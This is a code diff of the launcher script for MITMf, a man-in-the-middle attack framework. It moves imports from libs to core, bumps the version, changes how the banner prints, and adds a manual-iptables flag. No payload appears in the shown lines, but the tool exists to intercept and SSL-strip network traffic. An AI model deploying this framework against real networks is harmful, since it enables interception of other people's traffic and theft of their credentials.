@@ -18,26 +18,23 @@
 # USA
 #
 
+import sys
+import argparse
+import os
+import logging
+
 from twisted.web import http
 from twisted.internet import reactor
-
-from libs.sslstrip.CookieCleaner import CookieCleaner
-from libs.sergioproxy.ProxyPlugins import ProxyPlugins
-from libs.banners import get_banner
-
-import logging
+from core.sslstrip.CookieCleaner import CookieCleaner
+from core.sergioproxy.ProxyPlugins import ProxyPlugins
+from core.utils import Banners
+from configobj import ConfigObj
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
 from scapy.all import get_if_addr, get_if_hwaddr
 
-from configobj import ConfigObj
-
 from plugins import *
 plugin_classes = plugin.Plugin.__subclasses__()
-
-import sys
-import argparse
-import os
 
 try:
     import netfilterqueue
@@ -52,12 +49,11 @@ try:
 except ImportError:
     print "[-] user_agents library missing! User-Agent parsing will be disabled!"
 
-mitmf_version = "0.9.5"
+mitmf_version = "0.9.6"
 sslstrip_version = "0.9"
 sergio_version = "0.2.1"
 
-banner = get_banner()
-print banner
+Banners().printBanner
 
 parser = argparse.ArgumentParser(description="MITMf v%s - Framework for MITM attacks" % mitmf_version, version=mitmf_version, usage='', epilog="Use wisely, young Padawan.",fromfile_prefix_chars='@')
 #add MITMf options
@@ -66,6 +62,9 @@ mgroup.add_argument("--log-level", type=str,choices=['debug', 'info'], default="
 mgroup.add_argument("-i", "--interface", required=True, type=str,  metavar="interface" ,help="Interface to listen on")
 mgroup.add_argument("-c", "--config-file", dest='configfile', type=str, default="./config/mitmf.cfg", metavar='configfile', help="Specify config file to use")
 mgroup.add_argument('-d', '--disable-proxy', dest='disproxy', action='store_true', default=False, help='Only run plugins, disable all proxies')
+#added by alexander.georgiev@daloo.de
+mgroup.add_argument('-m', '--manual-iptables', dest='manualiptables', action='store_true', default=False, help='Do not setup iptables or flush them automatically')
+
 #add sslstrip options
 sgroup = parser.add_argument_group("SSLstrip", "Options for SSLstrip library")
 #sgroup.add_argument("-w", "--write", type=argparse.FileType('w'), metavar="filename", default=sys.stdout, help="Specify file to log to (stdout by default).")
@@ -177,8 +176,8 @@ if args.disproxy:
     ProxyPlugins.getInstance().setPlugins(load)
 else:
     
-    from libs.sslstrip.StrippingProxy import StrippingProxy
-    from libs.sslstrip.URLMonitor import URLMonitor
+    from core.sslstrip.StrippingProxy import StrippingProxy
+    from core.sslstrip.URLMonitor import URLMonitor
 
     URLMonitor.getInstance().setFaviconSpoofing(args.favicon)
     CookieCleaner.getInstance().setEnabled(args.killsessions)
